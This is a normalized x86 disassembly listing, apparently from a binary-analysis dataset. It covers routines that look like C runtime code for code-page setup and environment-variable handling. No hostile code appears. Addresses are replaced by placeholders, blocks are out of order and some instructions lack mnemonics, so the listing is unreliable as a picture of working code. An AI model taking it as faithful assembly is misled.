cmp edi 0x7fffffff
ja r-xdata
push 0x4
push 0x4
call sub_42d196
push 0x0
mov [ esi ] eax
call sub_42d0aa
mov eax [ esi ]
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
retn
push 0xc
pop eax
jmp r-xdata
push ebx
push 0x4
lea ebx [ edi + edi ]
push ebx
push [ esi ]
call sub_43c4d1
add esp 0xc
test eax eax
jne r-xdata
mov [ esi + 0x4 ] eax
add eax 0x10
mov [ esi + 0x8 ] eax
jmp r-xdata
mov [ esi ] eax
lea ecx [ eax + edi * 4 ]
lea eax [ eax + ebx * 4 ]
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] eax
xor esi esi
push 0xc
pop esi
jmp r-xdata
push 0x0
call sub_42d0aa
pop ecx
mov eax esi
pop ebx
sub_437877
push 0x8
push r--data
call sub_40d260
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f32c
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_437928
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4378ae
call sub_40d2a6
retn 0xc
sub_4378ba
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_437877
mov esp ebp
pop ebp
retn
sub_437928
mov edi edi
push esi
mov esi ecx
push 0xc
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] eax
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x8 ]
mov [ rw-data ] eax
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x21c ]
mov [ rw-data ] eax
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
add eax 0xc
push eax
push 0xc
push rw-data
call sub_43809d
mov eax [ esi ]
mov ecx 0x101
push ecx
mov eax [ eax ]
mov eax [ eax + 0x48 ]
add eax 0x18
push eax
push ecx
push rw-data
call sub_43809d
mov eax [ esi ]
mov ecx 0x100
push ecx
mov eax [ eax ]
mov eax [ eax + 0x48 ]
add eax 0x119
push eax
push ecx
push rw-data
call sub_43809d
mov eax [ rw-data ]
add esp 0x30
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
mov [ rw-data ] eax
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
[ eax ]
pop esi
retn
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
push eax
call sub_42d0aa
pop ecx
sub_4379ec
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub eax 0x3a4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0x4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0xd
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0x1
je r-xdata
mov eax [ r--data ]
pop ebp
retn
xor eax eax
pop ebp
retn
sub_437a2a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push 0x0
call sub_41cb44
and [ rw-data ] 0x0
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
jmp r-xdata
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ rw-data ] 0x1
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_437a9d
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x101
xor edi edi
lea esi [ ebx + 0x18 ]
push edi
push esi
call sub_40de60
mov [ ebx + 0x4 ] edi
xor eax eax
mov [ ebx + 0x8 ] edi
add esp 0xc
mov [ ebx + 0x21c ] edi
mov ecx 0x101
lea edi [ ebx + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov edi rw-data
sub edi ebx
mov al [ edi + esi ]
mov [ esi ] al
inc esi
sub ecx 0x1
jne r-xdata
lea ecx [ ebx + 0x119 ]
mov edx 0x100
mov al [ ecx + edi ]
mov [ ecx ] al
inc ecx
sub edx 0x1
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_437b02
mov edi edi
push ebp
mov ebp esp
sub esp 0x720
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x718 ]
push edi
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
xor ebx ebx
mov edi 0x100
test eax eax
je r-xdata
push 0xffffff9f
lea edx [ esi + 0x119 ]
mov ecx ebx
pop eax
sub eax edx
mov [ ebp - 0x720 ] eax
mov eax ebx
cmp [ ebp - 0x71c ] 0x19
ja r-xdata
or [ esi + ecx + 0x19 ] 0x10
lea eax [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x712 ]
lea ecx [ ebp - 0x712 ]
mov [ ebp - 0x104 ] 0x20
jmp r-xdata
mov [ edx ] bl
lea eax [ esi + ecx ]
or [ eax + 0x19 ] 0x20
lea eax [ ecx - 0x20 ]
mov [ edx ] al
jmp r-xdata
test al al
jne r-xdata
add edx ecx
add eax edx
mov [ ebp - 0x71c ] eax
add eax 0x20
cmp eax 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x720 ]
lea edx [ esi + 0x119 ]
inc ecx
cmp ecx edi
jb r-xdata
movzx edx [ ecx + 0x1 ]
movzx eax al
jmp r-xdata
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x704 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push ebx
call sub_43ad9c
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0x21c ]
push ebx
call sub_43fcef
add esp 0x40
lea eax [ ebp - 0x304 ]
push ebx
push [ esi + 0x4 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0x21c ]
push ebx
call sub_43fcef
add esp 0x24
mov ecx ebx
cmp eax edx
jbe r-xdata
test al 0x2
je r-xdata
or [ esi + ecx + 0x19 ] 0x10
mov al [ ebp + ecx - 0x204 ]
jmp r-xdata
cmp eax edi
jae r-xdata
add ecx 0x2
mov al [ ecx ]
mov [ esi + ecx + 0x119 ] bl
or [ esi + ecx + 0x19 ] 0x20
mov al [ ebp + ecx - 0x304 ]
mov [ esi + ecx + 0x119 ] al
jmp r-xdata
mov [ ebp + eax - 0x104 ] 0x20
inc eax
movzx eax [ ebp + ecx * 2 - 0x704 ]
test al 0x1
je r-xdata
jmp r-xdata
inc ecx
cmp ecx edi
jb r-xdata
sub_437c96
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
call sub_42fa1d
mov [ ebp - 0x4 ] eax
call sub_437db5
push [ ebp + 0x8 ]
call sub_437a2a
pop ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov ecx [ ecx + 0x48 ]
cmp eax [ ecx + 0x4 ]
jne r-xdata
push ebx
push esi
push edi
push 0x220
call sub_42d0e4
mov edi eax
or ebx 0xffffffff
pop ecx
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov esi ebx
mov esi [ ebp - 0x4 ]
mov ecx 0x88
mov esi [ esi + 0x48 ]
[ edi ] [ esi ]
mov edi eax
push edi
push [ ebp - 0xc ]
and [ edi ] 0x0
call sub_437eac
mov esi eax
pop ecx
pop ecx
cmp esi ebx
jne r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_42fef5
mov [ eax ] 0x16
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
[ eax ] ebx
dec ebx
jne r-xdata
call sub_42b761
mov [ edi ] 0x1
mov ecx edi
mov eax [ ebp - 0x4 ]
xor edi edi
mov [ eax + 0x48 ] ecx
mov eax [ ebp - 0x4 ]
test [ eax + 0x350 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] rw-data
je r-xdata
push edi
call sub_42d0aa
pop ecx
pop edi
mov eax esi
pop esi
pop ebx
test [ rw-data ] 0x1
jne r-xdata
push [ eax + 0x48 ]
call sub_42d0aa
pop ecx
lea eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x5
call sub_4378ba
cmp [ ebp + 0xc ] 0x0
pop ecx
pop ecx
je r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
jmp r-xdata
sub_437db5
push 0xc
push r--data
call sub_40d260
xor esi esi
mov [ ebp - 0x1c ] esi
call sub_42fa1d
mov edi eax
mov ecx [ rw-data ]
test [ edi + 0x350 ] ecx
je r-xdata
push 0x5
call sub_42f32c
pop ecx
mov [ ebp - 0x4 ] esi
mov esi [ edi + 0x48 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x4c ] esi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_437e46
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x48 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x48 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
[ esi ]
or eax 0xffffffff
[ esi ] eax
jne r-xdata
mov eax esi
call sub_40d2a6
retn
call sub_42d153
cmp esi rw-data
je r-xdata
push esi
call sub_42d0aa
pop ecx
sub_437e63
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
xor esi esi
lea ecx [ ebp - 0x10 ]
push esi
call sub_41cb44
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esi [ eax + 0x4 ]
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_437eac
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
call sub_437a2a
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
push edi
xor edi edi
mov ecx edi
mov eax edi
mov [ ebp - 0x1c ] ecx
push esi
call sub_437a9d
pop ecx
xor eax eax
jmp r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_40de60
add esp 0xc
imul eax [ ebp - 0x1c ] 0x30
mov [ ebp - 0x20 ] eax
lea eax [ eax + rw-data ]
mov [ ebp - 0x1c ] eax
inc ecx
add eax 0x30
mov [ ebp - 0x1c ] ecx
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
inc edi
add eax 0x8
mov [ ebp - 0x1c ] eax
cmp edi 0x4
jb r-xdata
mov al [ ecx + 0x1 ]
test al al
je r-xdata
cmp [ eax + rw-data ] ebx
je r-xdata
cmp ebx 0xfde8
je r-xdata
cmp [ eax ] 0x0
mov ecx eax
je r-xdata
push ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] 0x1
call sub_4379ec
add esp 0x4
mov [ esi + 0x21c ] eax
mov eax [ ebp - 0x20 ]
lea ecx [ esi + 0xc ]
push 0x6
lea edx [ eax + rw-data ]
pop edi
mov eax [ ebp - 0x1c ]
movzx edx [ ecx ]
movzx eax al
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ebx 0xfde9
je r-xdata
mov ax [ edx ]
lea edx [ edx + 0x2 ]
mov [ ecx ] ax
lea ecx [ ecx + 0x2 ]
sub edi 0x1
jne r-xdata
push esi
call sub_437b02
cmp edx eax
jbe r-xdata
pop edi
movzx eax bx
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edx 0x100
jae r-xdata
add ecx 0x2
cmp [ ecx ] 0x0
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov al [ edi + rw-data ]
or [ esi + edx + 0x19 ] al
inc edx
movzx eax [ ecx + 0x1 ]
cmp [ rw-data ] edi
je r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_40de60
mov [ esi + 0x4 ] ebx
add esp 0xc
xor ebx ebx
mov [ esi + 0x21c ] edi
inc ebx
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
push esi
call sub_437a9d
jmp r-xdata
mov [ esi + 0x8 ] edi
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
pop ecx
xor eax eax
lea eax [ esi + 0x1a ]
mov ecx 0xfe
mov cl [ eax + 0x1 ]
test cl cl
je r-xdata
or [ eax ] 0x8
inc eax
sub ecx 0x1
jne r-xdata
push [ esi + 0x4 ]
call sub_4379ec
add esp 0x4
mov [ esi + 0x21c ] eax
mov [ esi + 0x8 ] ebx
jmp r-xdata
movzx edx cl
movzx ecx [ eax ]
jmp r-xdata
xor eax eax
lea edi [ esi + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp ecx edx
jbe r-xdata
or [ esi + ecx + 0x19 ] 0x4
inc ecx
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
sub_43809d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
call sub_42fef5
push 0x16
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push eax
call sub_40de60
add esp 0xc
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
call sub_42fef5
push 0x16
jmp r-xdata
push esi
push edi
push eax
call sub_40d8e0
add esp 0xc
xor eax eax
jmp r-xdata
push 0x16
pop eax
call sub_42fef5
push 0x22
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
pop edi
sub_43811e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_41cb44
movzx esi [ ebp + 0xc ]
mov eax [ ebp - 0x8 ]
mov cl [ ebp + 0x14 ]
test [ eax + esi + 0x19 ] cl
jne r-xdata
xor edx edx
inc edx
xor edx edx
cmp [ ebp + 0x10 ] edx
je r-xdata
mov eax edx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax edx
mov eax [ ebp - 0xc ]
mov eax [ eax ]
movzx eax [ eax + esi * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
test eax eax
je r-xdata
sub_4381e5
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x9
jne r-xdata
push 0x2
push 0x40
push [ ebp + 0x8 ]
push 0x0
call sub_43811e
add esp 0x10
pop ebp
retn
push 0x40
pop eax
pop ebp
retn
sub_438208
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x9
jne r-xdata
push 0x2
push 0x40
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_43811e
add esp 0x10
pop ebp
retn
push 0x40
pop eax
pop ebp
retn
sub_4382a7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cb44
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
xor ecx ecx
cmp [ eax + 0x4 ] 0x3a4
jne r-xdata
mov eax ecx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
and [ eax + 0x350 ] 0xfffffffd
push 0x3
push 0x0
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_43811e
add esp 0x10
mov ecx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_43846a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
call sub_42fef5
push 0x16
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
mov [ eax ] ecx
xor eax eax
pop esi
pop ebp
retn
sub_43849b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
call sub_42fef5
push 0x16
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
mov [ eax ] ecx
xor eax eax
pop esi
pop ebp
retn
sub_438524
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push edi
xor edi edi
cmp [ edx ] di
je r-xdata
lea eax [ edx + 0x2 ]
pop edi
pop ebp
retn
push esi
mov ax [ ecx ]
add ecx 0x2
cmp ax di
jne r-xdata
sub ecx esi
sar ecx 0x1
lea edx [ edx + ecx * 2 ]
add edx 0x2
cmp [ edx ] di
jne r-xdata
mov ecx edx
lea esi [ ecx + 0x2 ]
pop esi
sub_438569
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
call [ GetEnvironmentStringsW@IAT ]
mov esi eax
xor edi edi
test esi esi
je r-xdata
mov ebx edi
push esi
call sub_438524
pop ecx
push edi
push edi
push edi
mov ebx eax
push edi
sub ebx esi
sar ebx 0x1
push ebx
push esi
push edi
push edi
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
push esi
call [ FreeEnvironmentStringsW@IAT ]
push eax
call sub_42d0e4
mov edi eax
pop ecx
test edi edi
je r-xdata
xor ebx ebx
xor eax eax
push eax
push eax
push [ ebp - 0x4 ]
push edi
push ebx
push esi
push eax
push eax
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov ebx edi
xor edi edi
jmp r-xdata
push edi
call sub_42d0aa
pop ecx
jmp r-xdata
sub_4385ec
mov edi edi
push esi
push edi
call [ GetEnvironmentStringsW@IAT ]
mov esi eax
test esi esi
jne r-xdata
push ebx
push esi
call sub_438524
sub eax esi
sar eax 0x1
lea ebx [ eax + eax ]
push ebx
call sub_42d0e4
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
xor edi edi
jmp r-xdata
push 0x0
call sub_42d0aa
pop ecx
push esi
call [ FreeEnvironmentStringsW@IAT ]
pop ebx
push ebx
push esi
push edi
call sub_40d8e0
add esp 0xc
mov eax edi
pop edi
pop esi
retn
sub_43863c
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
push edi
push 0x3d
push ebx
mov edi ebx
call sub_44cbf0
mov [ ebp - 0xc ] eax
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
cmp eax ebx
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x1 ] 0x0
mov esi [ rw-data ]
sete al
mov [ ebp - 0x1 ] al
cmp esi [ rw-data ]
jne r-xdata
xor ebx ebx
test esi esi
jne r-xdata
push esi
call sub_438ab4
mov esi eax
mov al [ ebp - 0x1 ]
pop ecx
mov [ rw-data ] esi
mov eax [ ebp - 0xc ]
mov ecx edi
sub eax ecx
push eax
push ecx
call sub_438c23
mov [ ebp - 0x8 ] eax
pop ecx
pop ecx
test eax eax
js r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
cmp [ ebp - 0x1 ] bl
jne r-xdata
cmp [ esi ] ebx
je r-xdata
test al al
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
push edi
call sub_42d0aa
pop ecx
pop edi
mov eax ebx
pop esi
neg eax
mov [ ebp - 0x8 ] eax
lea ecx [ eax + 0x2 ]
cmp ecx eax
jb r-xdata
push [ esi + eax * 4 ]
call sub_42d0aa
pop ecx
mov ecx [ ebp - 0x8 ]
cmp [ ebp - 0x1 ] bl
jne r-xdata
push 0x4
push 0x1
call sub_42d196
push ebx
mov [ rw-data ] eax
call sub_42d0aa
mov esi [ rw-data ]
add esp 0xc
test esi esi
je r-xdata
xor ebx ebx
jmp r-xdata
call j_sub_42a53e#2
test eax eax
jne r-xdata
or ebx 0xffffffff
cmp ecx 0x3fffffff
jae r-xdata
cmp [ esi + ecx * 4 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edi ebx
mov [ esi + ecx * 4 ] eax
jmp r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ rw-data ]
push 0x4
push ecx
push esi
call sub_43c4d1
push ebx
mov esi eax
call sub_42d0aa
add esp 0x10
test esi esi
je r-xdata
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ esi + ecx * 4 ] eax
inc ecx
push 0x4
push ecx
push esi
call sub_43c4d1
push ebx
mov esi eax
call sub_42d0aa
add esp 0x10
mov eax edi
test esi esi
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
test esi esi
je r-xdata
push 0x4
push 0x1
call sub_42d196
push ebx
mov [ rw-data ] eax
call sub_42d0aa
add esp 0xc
cmp [ rw-data ] ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edi ebx
mov eax [ ebp + 0x8 ]
mov [ esi + ecx * 4 ] eax
mov [ esi + ecx * 4 + 0x4 ] ebx
jmp r-xdata
mov ecx eax
lea edx [ ecx + 0x1 ]
mov [ rw-data ] esi
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push 0x1
lea eax [ ecx + 0x2 ]
push eax
mov [ ebp - 0x8 ] eax
call sub_42d196
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
call sub_42d0aa
pop ecx
jmp r-xdata
push [ ebp + 0x8 ]
push [ ebp - 0x8 ]
push esi
call sub_42cfc7
add esp 0xc
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_42fdfc
int3
mov ecx [ ebp - 0xc ]
mov eax esi
sub eax [ ebp + 0x8 ]
inc ecx
add ecx eax
movzx eax [ ebp - 0x1 ]
neg eax
sbb eax eax
not eax
mov [ ecx - 0x1 ] bl
and eax ecx
push eax
push esi
call [ SetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
call sub_42fef5
or ebx 0xffffffff
mov [ eax ] 0x2a
sub_438877
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
push edi
push 0x3d
push ebx
mov edi ebx
call sub_44cd1b
mov [ ebp - 0xc ] eax
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
cmp eax ebx
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ rw-data ]
xor ebx ebx
cmp [ eax + 0x2 ] bx
sete cl
mov [ ebp - 0x1 ] cl
cmp esi [ rw-data ]
jne r-xdata
test esi esi
jne r-xdata
push esi
call sub_438b65
pop ecx
mov cl [ ebp - 0x1 ]
mov esi eax
mov [ rw-data ] esi
mov ecx [ ebp - 0xc ]
mov eax edi
sub ecx eax
sar ecx 0x1
push ecx
push eax
mov [ ebp - 0xc ] ecx
call sub_438c77
mov [ ebp - 0x8 ] eax
pop ecx
pop ecx
test eax eax
js r-xdata
mov eax [ rw-data ]
cmp [ ebp + 0xc ] ebx
je r-xdata
cmp [ ebp - 0x1 ] bl
jne r-xdata
cmp [ esi ] ebx
je r-xdata
test cl cl
jne r-xdata
test eax eax
je r-xdata
push edi
call sub_42d0aa
pop ecx
pop edi
mov eax ebx
pop esi
neg eax
mov [ ebp - 0x8 ] eax
lea ecx [ eax + 0x2 ]
cmp ecx eax
jb r-xdata
push [ esi + eax * 4 ]
call sub_42d0aa
pop ecx
mov ecx [ ebp - 0x8 ]
cmp [ ebp - 0x1 ] bl
jne r-xdata
test eax eax
jne r-xdata
call j_sub_42a56d#2
test eax eax
jne r-xdata
or ebx 0xffffffff
cmp ecx 0x3fffffff
jae r-xdata
cmp [ esi + ecx * 4 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edi ebx
mov [ esi + ecx * 4 ] eax
jmp r-xdata
push 0x4
push 0x1
call sub_42d196
push ebx
mov [ rw-data ] eax
call sub_42d0aa
add esp 0xc
push 0x4
push 0x1
call sub_42d196
push ebx
mov [ rw-data ] eax
call sub_42d0aa
add esp 0xc
cmp [ rw-data ] ebx
je r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
push 0x4
push ecx
push esi
call sub_43c4d1
push ebx
mov esi eax
call sub_42d0aa
add esp 0x10
test esi esi
je r-xdata
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ esi + ecx * 4 ] eax
inc ecx
push 0x4
push ecx
push esi
call sub_43c4d1
push ebx
mov esi eax
call sub_42d0aa
add esp 0x10
mov eax edi
test esi esi
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi ebx
mov eax [ ebp + 0x8 ]
mov [ esi + ecx * 4 ] eax
mov [ esi + ecx * 4 + 0x4 ] ebx
jmp r-xdata
mov ecx eax
lea edx [ ecx + 0x2 ]
mov [ rw-data ] esi
mov ax [ ecx ]
add ecx 0x2
cmp ax bx
jne r-xdata
sub ecx edx
sar ecx 0x1
push 0x2
lea eax [ ecx + 0x2 ]
push eax
mov [ ebp - 0x8 ] eax
call sub_42d196
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
call sub_42d0aa
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
push [ ebp - 0x8 ]
push esi
call sub_436740
add esp 0xc
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_42fdfc
int3
mov ecx [ ebp - 0xc ]
inc ecx
lea ecx [ esi + ecx * 2 ]
mov [ ecx - 0x2 ] ax
movzx eax [ ebp - 0x1 ]
neg eax
sbb eax eax
not eax
and eax ecx
push eax
push esi
call [ SetEnvironmentVariableW@IAT ]
test eax eax
jne r-xdata
call sub_42fef5
or ebx 0xffffffff
mov [ eax ] 0x2a
sub_438ab4
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
xor ecx ecx
mov eax edi
cmp [ edi ] ecx
je r-xdata
xor eax eax
jmp r-xdata
push esi
lea eax [ ecx + 0x1 ]
push 0x4
push eax
call sub_42d196
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
lea eax [ eax + 0x4 ]
inc ecx
cmp [ eax ] 0x0
jne r-xdata
pop edi
mov esp ebp
pop ebp
retn
call sub_42d153
cmp [ edi ] 0x0
je r-xdata
push 0x0
call sub_42d0aa
pop ecx
mov eax esi
pop esi
push ebx
mov ebx esi
sub ebx edi
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push 0x1
lea eax [ ecx + 0x1 ]
push eax
mov [ ebp - 0x4 ] eax
call sub_42d196
push 0x0
mov [ ebx + edi ] eax
call sub_42d0aa
add esp 0xc
cmp [ ebx + edi ] 0x0
je r-xdata
push [ edi ]
push [ ebp - 0x4 ]
push [ ebx + edi ]
call sub_42cfc7
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42fdfc
int3
add edi 0x4
cmp [ edi ] eax
jne r-xdata
mov ecx [ edi ]
lea edx [ ecx + 0x1 ]
pop ebx
sub_438b65
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
push ebx
xor ebx ebx
mov eax edi
mov ecx ebx
mov [ ebp - 0x4 ] ebx
push esi
cmp [ edi ] ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ecx + 0x1 ]
push 0x4
push eax
call sub_42d196
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
lea eax [ eax + 0x4 ]
inc ecx
cmp [ eax ] ebx
jne r-xdata
pop edi
mov esp ebp
pop ebp
retn
call sub_42d153
